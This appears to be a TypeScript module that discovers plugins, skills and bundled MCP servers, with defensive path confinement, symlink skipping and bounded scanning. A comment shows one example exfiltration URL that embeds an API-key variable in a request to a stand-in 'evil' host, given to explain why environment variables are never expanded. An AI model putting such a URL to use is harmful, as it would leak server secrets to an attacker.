import fs from "fs";
import fsp from "fs/promises";
import path from "path";
import { parseFrontmatter } from "./frontmatter";

/**
 * Pure parsing/discovery over an on-disk plugin (or marketplace) tree. Every
 * function is defensive: a malformed manifest or skill is skipped with a
 * warning, never thrown, so one bad file can't abort a whole install. See
 * src/lib/plugins/install.ts for how these are orchestrated after a source is
 * fetched, and CONTRACTS for the field-level spec (marketplace.json /
 * plugin.json / SKILL.md / .mcp.json).
 */

const MAX_SKILL_DESC = 1024;
const MAX_SKILL_NAME = 64;
/** Upper bound on skills discovered in one plugin (a big skill collection like
 *  gstack has ~60) + a cap on directories walked, so a pathological repo can't
 *  make discovery run unbounded. */
const MAX_SKILLS_PER_PLUGIN = 500;
const MAX_SKILL_SCAN_DIRS = 10_000;
const MAX_SKILL_SCAN_DEPTH = 5;

// ---- discovered shapes ----------------------------------------------------

export interface DiscoveredSkill {
  name: string;
  description: string;
  /** Skill directory RELATIVE to the plugin root ("." for a root SKILL.md). */
  dir: string;
  /** SKILL.md `user-invocable` (default true). */
  userInvocable: boolean;
  /** !SKILL.md `disable-model-invocation` (default true). */
  modelInvocable: boolean;
  /** SKILL.md `argument-hint`. */
  argumentHint?: string;
}

export interface DiscoveredMcpServer {
  name: string;
  /** True only for a remote Streamable-HTTP server this app can actually run. */
  supported: boolean;
  /** Present when supported: the (env-expanded) endpoint URL. */
  url?: string;
  /** Why an unsupported server was skipped. */
  reason?: string;
}

export interface DiscoveredPlugin {
  name: string;
  description?: string;
  version?: string;
  author?: string;
  /** Absolute path of this plugin's root directory. */
  rootDir: string;
  skills: DiscoveredSkill[];
  mcpServers: DiscoveredMcpServer[];
  warnings: string[];
}

export interface MarketplaceEntry {
  name: string;
  /** Raw `source` value (string relative path or object form). */
  source: unknown;
  description?: string;
  version?: string;
}

export interface ParsedMarketplace {
  name: string;
  /** metadata.pluginRoot, prepended to relative plugin sources. */
  pluginRoot?: string;
  entries: MarketplaceEntry[];
}

// ---- json helpers ---------------------------------------------------------

function readJson(file: string): unknown {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return null;
  }
}

function isObj(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function str(v: unknown): string | undefined {
  return typeof v === "string" && v.trim() ? v.trim() : undefined;
}

/** Extract a display author from plugin.json's `author` (object or string). */
function authorName(v: unknown): string | undefined {
  if (typeof v === "string") return str(v);
  if (isObj(v)) return str(v.name);
  return undefined;
}

// ---- manifests ------------------------------------------------------------

/** Parse `.claude-plugin/marketplace.json` at `repoRoot`, or null if absent. */
export function parseMarketplace(repoRoot: string): ParsedMarketplace | null {
  const file = path.join(repoRoot, ".claude-plugin", "marketplace.json");
  if (!fs.existsSync(file)) return null;
  const raw = readJson(file);
  if (!isObj(raw)) return null;
  const name = str(raw.name);
  const plugins = Array.isArray(raw.plugins) ? raw.plugins : [];
  const metadata = isObj(raw.metadata) ? raw.metadata : {};
  const entries: MarketplaceEntry[] = [];
  for (const p of plugins) {
    if (!isObj(p)) continue;
    const pname = str(p.name);
    if (!pname || p.source === undefined) continue;
    entries.push({
      name: pname,
      source: p.source,
      description: str(p.description),
      version: str(p.version),
    });
  }
  return {
    name: name ?? "marketplace",
    pluginRoot: str(metadata.pluginRoot),
    entries,
  };
}

export interface PluginManifest {
  name?: string;
  description?: string;
  version?: string;
  author?: string;
  /** Extra skill dirs (manifest `skills`), each relative and `./`-prefixed. */
  skillPaths: string[];
  /** Raw `mcpServers` manifest value (string path, array, or inline object). */
  mcpServers?: unknown;
}

/** Parse `.claude-plugin/plugin.json` at `pluginRoot`, or null if absent. */
export function parsePluginManifest(pluginRoot: string): PluginManifest | null {
  const file = path.join(pluginRoot, ".claude-plugin", "plugin.json");
  if (!fs.existsSync(file)) return null;
  const raw = readJson(file);
  if (!isObj(raw)) return null;

  const skillPaths: string[] = [];
  const s = raw.skills;
  if (typeof s === "string") skillPaths.push(s);
  else if (Array.isArray(s)) for (const x of s) if (typeof x === "string") skillPaths.push(x);

  return {
    name: str(raw.name),
    description: str(raw.description),
    version: str(raw.version),
    author: authorName(raw.author),
    skillPaths,
    mcpServers: raw.mcpServers,
  };
}

// ---- skills ---------------------------------------------------------------

/**
 * Normalize a skill name into a slash-command-safe token: lowercase, only
 * [a-z0-9_-], no leading/trailing separators, ≤64 chars. This keeps the `/`
 * menu, the composer's slash regex, and resolveSlashSkill in agreement, so a
 * menu-picked command always resolves server-side (a raw name like "PDF Filler"
 * or "pdf.tools" would otherwise be offered but never match). Returns "" when
 * nothing usable remains, and the caller skips the skill.
 */
function sanitizeName(name: string): string {
  return name
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9_-]+/g, "-")
    .replace(/^[-_]+/, "")
    .slice(0, MAX_SKILL_NAME)
    .replace(/[-_]+$/, "");
}

/** Parse a single skill directory (containing SKILL.md). Returns null when
 *  there's no SKILL.md or no usable description. `dir` is relative to the
 *  plugin root. `fallbackName` (the plugin's own name) is used when the skill is
 *  the plugin root itself (dir === ".") and its SKILL.md omits a name, so a
 *  single-skill git plugin never inherits the throwaway temp-clone dir name. */
function parseSkillDir(
  pluginRoot: string,
  dir: string,
  fallbackName: string,
  warnings: string[],
): DiscoveredSkill | null {
  const skillMd = path.join(pluginRoot, dir, "SKILL.md");
  // Require a REAL SKILL.md — a regular file, not a symlink. install.ts copyTree
  // skips symlinks, so a symlinked SKILL.md would never reach the install dir and
  // the skill would error on every load; discovering it must agree with the copy.
  const lst = fs.lstatSync(skillMd, { throwIfNoEntry: false });
  if (!lst || !lst.isFile()) return null;
  let content: string;
  try {
    content = fs.readFileSync(skillMd, "utf8");
  } catch {
    return null;
  }
  const { data } = parseFrontmatter(content);
  const baseName = dir === "." ? fallbackName : path.basename(dir);
  const name = sanitizeName(data.name || baseName);
  const description = (data.description || "").trim();
  if (!name) {
    warnings.push(`Skipped a skill in "${dir}": missing name.`);
    return null;
  }
  if (!description) {
    warnings.push(
      `Skipped skill "${name}": SKILL.md has no \`description\` (required for the model to know when to use it).`,
    );
    return null;
  }
  // Claude-Code invocation controls (all optional): `user-invocable: false` →
  // Claude-only (no slash menu); `disable-model-invocation: true` → user-only
  // (not auto-suggested); `argument-hint` → shown in the slash menu.
  const bool = (v: string | undefined): boolean | undefined => {
    const t = v?.trim().toLowerCase();
    if (t === "true" || t === "yes" || t === "on" || t === "1") return true;
    if (t === "false" || t === "no" || t === "off" || t === "0") return false;
    return undefined;
  };
  const userInvocable = bool(data["user-invocable"]) !== false;
  const modelInvocable = bool(data["disable-model-invocation"]) !== true;
  const argumentHint = (data["argument-hint"] || "").trim() || undefined;
  return {
    name,
    description: description.slice(0, MAX_SKILL_DESC),
    dir,
    userInvocable,
    modelInvocable,
    argumentHint,
  };
}

/**
 * Discover every skill in a plugin by a bounded breadth-first walk from the
 * plugin root. A directory that DIRECTLY contains a SKILL.md is a skill (and a
 * leaf — we don't descend into it, so a skill's own references/ can't spawn
 * stray skills). The plugin ROOT is the one exception: it's always descended,
 * because a repo may hold a top-level SKILL.md AND many sibling skill
 * directories — the "flat collection" layout (e.g. github.com/garrytan/gstack:
 * one dir per skill, no `skills/` parent). This one walk covers every real
 * layout: `skills/<name>/SKILL.md`, top-level `<name>/SKILL.md`,
 * `<container>/skills/<name>/SKILL.md`, and a lone root SKILL.md. A SKILL.md
 * lacking valid name+description frontmatter is skipped by parseSkillDir, so a
 * doc file named SKILL.md never becomes a skill. Also honors the manifest's
 * `skills` paths. Deduplicates by skill name (first wins).
 */
export function discoverSkills(
  pluginRoot: string,
  manifest: PluginManifest | null,
  fallbackName: string,
  warnings: string[],
): DiscoveredSkill[] {
  const found: DiscoveredSkill[] = [];
  const seen = new Set<string>();
  const rootResolved = path.resolve(pluginRoot);

  // Returns true when `dir` is a REAL skill dir (a valid SKILL.md parsed), even
  // if its name was a dedup collision — the BFS uses this to decide whether the
  // dir is a leaf. A dir whose SKILL.md is missing/invalid/a doc returns false
  // so the walk keeps descending into it (its real nested skills aren't lost).
  const add = (dir: string): boolean => {
    const skill = parseSkillDir(pluginRoot, dir, fallbackName, warnings);
    if (!skill) return false;
    if (!seen.has(skill.name)) {
      seen.add(skill.name);
      found.push(skill);
    }
    return true;
  };

  // Confine a manifest-supplied relative path to the plugin root (resolve +
  // prefix, matching install.ts#resolveEntry). `rel.startsWith("..")` alone
  // misses embedded traversal like "x/../../secret".
  const withinRoot = (rel: string): boolean => {
    if (!rel || path.isAbsolute(rel)) return false;
    const abs = path.resolve(pluginRoot, rel);
    return abs === rootResolved || abs.startsWith(rootResolved + path.sep);
  };

  // Bounded breadth-first walk (shallow skills first). Skip VCS/dep/manifest
  // dirs and symlinks (e.isDirectory() is false for a symlink under lstat
  // semantics, so a symlinked dir is neither descended nor added — avoids
  // follow-out and duplicate aliases).
  const SKIP_DIRS = new Set([".git", "node_modules", ".claude-plugin"]);
  const queue: Array<{ rel: string; depth: number }> = [{ rel: ".", depth: 0 }];
  let scanned = 0;
  let truncated = false;
  while (queue.length > 0) {
    if (found.length >= MAX_SKILLS_PER_PLUGIN) break;
    if (scanned >= MAX_SKILL_SCAN_DIRS) {
      truncated = true;
      break;
    }
    const { rel, depth } = queue.shift()!;
    scanned++;
    const absDir = rel === "." ? pluginRoot : path.join(pluginRoot, rel);
    if (fs.existsSync(path.join(absDir, "SKILL.md"))) {
      const added = add(rel);
      // A VALID skill directory is a leaf — except the root, which may hold a
      // top-level SKILL.md alongside sibling skill directories. A dir whose
      // SKILL.md is invalid/a doc/a symlink is NOT a leaf: keep descending so
      // real skills nested beneath a container SKILL.md aren't dropped.
      if (rel !== "." && added) continue;
    }
    if (depth >= MAX_SKILL_SCAN_DEPTH) continue;
    let entries: fs.Dirent[];
    try {
      entries = fs.readdirSync(absDir, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const e of entries) {
      if (!e.isDirectory() || SKIP_DIRS.has(e.name)) continue;
      queue.push({
        rel: rel === "." ? e.name : path.join(rel, e.name),
        depth: depth + 1,
      });
    }
  }
  if (truncated) {
    warnings.push(
      `Stopped scanning after ${MAX_SKILL_SCAN_DIRS} directories; some deeply-nested skills may be missing.`,
    );
  }

  // Manifest `skills` additions: each entry is a relative path to either a skill
  // dir (has SKILL.md) or a container of skill dirs.
  for (const raw of manifest?.skillPaths ?? []) {
    const rel = raw.replace(/^\.\//, "").replace(/\/+$/, "");
    if (!withinRoot(rel)) continue;
    const abs = path.join(pluginRoot, rel);
    if (!fs.existsSync(abs)) continue;
    if (fs.existsSync(path.join(abs, "SKILL.md"))) {
      add(rel);
    } else if (fs.statSync(abs).isDirectory()) {
      try {
        for (const e of fs.readdirSync(abs, { withFileTypes: true })) {
          if (e.isDirectory()) add(path.join(rel, e.name));
        }
      } catch {
        /* ignore */
      }
    }
  }

  return found;
}

// ---- bundled MCP ----------------------------------------------------------

/**
 * Expand the variables in a bundled MCP server URL. Returns `{ url, safe }`.
 *
 * DELIBERATELY never reads process.env: expanding a server-side secret into a
 * plugin-supplied URL would let a malicious plugin exfiltrate it (e.g.
 * `https://evil/${OPENAI_API_KEY}`). `safe` is set false when the URL references
 * a filesystem-path variable (`${CLAUDE_PLUGIN_ROOT}` — it has no place in an
 * HTTP URL and would leak the install path + userId to the plugin's host), or an
 * undefaulted `${VAR}` that collapses to empty (which would otherwise yield a
 * malformed URL classified as valid). Only `${VAR:-default}` expands cleanly.
 * The caller treats an unsafe/invalid URL as an unsupported server.
 */
function expandUrlVars(input: string): { url: string; safe: boolean } {
  let safe = true;
  const url = input.replace(
    /\$\{([A-Za-z0-9_]+)(?::-([^}]*))?\}/g,
    (_m, name: string, def: string | undefined) => {
      if (name === "CLAUDE_PLUGIN_ROOT" || def === undefined) {
        safe = false;
        return "";
      }
      return def;
    },
  );
  return { url, safe };
}

/** Read a plugin's MCP declarations from `.mcp.json` and the manifest's
 *  `mcpServers` field (both merge by server name; .mcp.json wins on collision).
 *  Classifies each: only remote Streamable-HTTP (`type: http`) servers with a
 *  URL are `supported` by this app's remote-only MCP client. */
export function discoverMcpServers(
  pluginRoot: string,
  manifest: PluginManifest | null,
): DiscoveredMcpServer[] {
  const configs: Record<string, unknown> = {};

  const rootResolved = path.resolve(pluginRoot);
  // 1) manifest.mcpServers: a path string, array of paths, or inline object.
  const collectFromValue = (val: unknown) => {
    if (typeof val === "string") {
      const rel = val.replace(/^\.\//, "");
      // Confine to the plugin root (resolve + prefix) — `startsWith("..")`
      // alone misses embedded traversal like "x/../../secret.json".
      if (!rel || path.isAbsolute(rel)) return;
      const abs = path.resolve(pluginRoot, rel);
      if (abs !== rootResolved && !abs.startsWith(rootResolved + path.sep)) return;
      const raw = readJson(abs);
      if (isObj(raw) && isObj(raw.mcpServers)) Object.assign(configs, raw.mcpServers);
    } else if (Array.isArray(val)) {
      for (const v of val) collectFromValue(v);
    } else if (isObj(val)) {
      // Inline: either { mcpServers: {...} } or the server map directly.
      const map = isObj(val.mcpServers) ? val.mcpServers : val;
      Object.assign(configs, map);
    }
  };
  if (manifest?.mcpServers !== undefined) collectFromValue(manifest.mcpServers);

  // 2) .mcp.json at the plugin root (wins on name collision).
  const dotMcp = readJson(path.join(pluginRoot, ".mcp.json"));
  if (isObj(dotMcp) && isObj(dotMcp.mcpServers)) {
    Object.assign(configs, dotMcp.mcpServers);
  }

  const out: DiscoveredMcpServer[] = [];
  for (const [name, cfgRaw] of Object.entries(configs)) {
    if (!isObj(cfgRaw)) continue;
    const type = str(cfgRaw.type)?.toLowerCase();
    const hasCommand = typeof cfgRaw.command === "string";
    const rawUrl = str(cfgRaw.url);

    // Remote Streamable-HTTP is the only transport this app's client speaks.
    const isHttp = type === "http" || type === "streamable-http";
    if (isHttp && rawUrl) {
      const { url, safe } = expandUrlVars(rawUrl);
      let valid = false;
      if (safe) {
        try {
          const u = new URL(url);
          valid = (u.protocol === "http:" || u.protocol === "https:") && !!u.hostname;
        } catch {
          valid = false;
        }
      }
      if (valid) {
        out.push({ name, supported: true, url });
      } else {
        out.push({
          name,
          supported: false,
          reason: "server URL uses unresolved/path variables or is not a valid http(s) URL.",
        });
      }
      continue;
    }
    if (hasCommand || (!type && !rawUrl)) {
      out.push({
        name,
        supported: false,
        reason: "stdio (command-based) MCP servers can't run in this app.",
      });
    } else if (type === "sse" || type === "ws") {
      out.push({
        name,
        supported: false,
        reason: `${type} transport is not supported (only Streamable HTTP).`,
      });
    } else if (rawUrl && !type) {
      out.push({
        name,
        supported: false,
        reason: 'remote server is missing `type: "http"`.',
      });
    } else {
      out.push({ name, supported: false, reason: "unrecognized MCP server config." });
    }
  }
  return out;
}

// ---- plugin assembly ------------------------------------------------------

/** Fully discover a single plugin rooted at `rootDir`: manifest + skills +
 *  bundled MCP. `fallbackName` (e.g. the dir or marketplace-entry name) is used
 *  when the manifest has no name. */
export function discoverPlugin(
  rootDir: string,
  fallbackName: string,
): DiscoveredPlugin {
  const warnings: string[] = [];
  const manifest = parsePluginManifest(rootDir);
  const pluginName = manifest?.name || fallbackName;
  const skills = discoverSkills(rootDir, manifest, pluginName, warnings);
  const mcpServers = discoverMcpServers(rootDir, manifest);

  return {
    name: pluginName,
    description: manifest?.description,
    version: manifest?.version,
    author: manifest?.author,
    rootDir,
    skills,
    mcpServers,
    warnings,
  };
}

/** True if `dir` looks like a plugin (has a manifest, a skills/ dir, or a root
 *  SKILL.md). Used to detect a single-plugin repo vs. a bare/unknown tree. */
export async function looksLikePlugin(dir: string): Promise<boolean> {
  const checks = [
    path.join(dir, ".claude-plugin", "plugin.json"),
    path.join(dir, "skills"),
    path.join(dir, "SKILL.md"),
  ];
  for (const c of checks) {
    try {
      await fsp.stat(c);
      return true;
    } catch {
      /* next */
    }
  }
  return false;
}
